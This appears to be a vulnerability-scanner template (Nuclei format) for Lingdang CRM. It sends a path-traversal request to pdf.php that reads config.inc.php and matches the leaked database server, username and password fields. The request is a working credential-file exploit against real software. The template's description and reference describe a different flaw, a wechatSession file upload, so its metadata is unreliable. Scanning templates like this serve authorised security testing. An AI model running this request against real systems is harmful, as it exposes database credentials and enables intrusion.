id: ldcrm-pdf-fileread

info:
  name: Lingdang CRM pdf.php - File Read
  author: qwtd
  severity: high
  description: |
    灵当CRM系统接口wechatSession文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
  reference:
    - https://wiki.wy876.cn/#/./%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3wechatSession%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E
  tags: 灵当CRM

http:
  - method: GET
    path:
      - "{{BaseURL}}/crm/data/pdf.php?url=../config.inc.php"
      
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "db_server"
          - "db_port"
          - "db_username"
          - "db_password"
        condition: and

      - type: status
        status:
          - 200
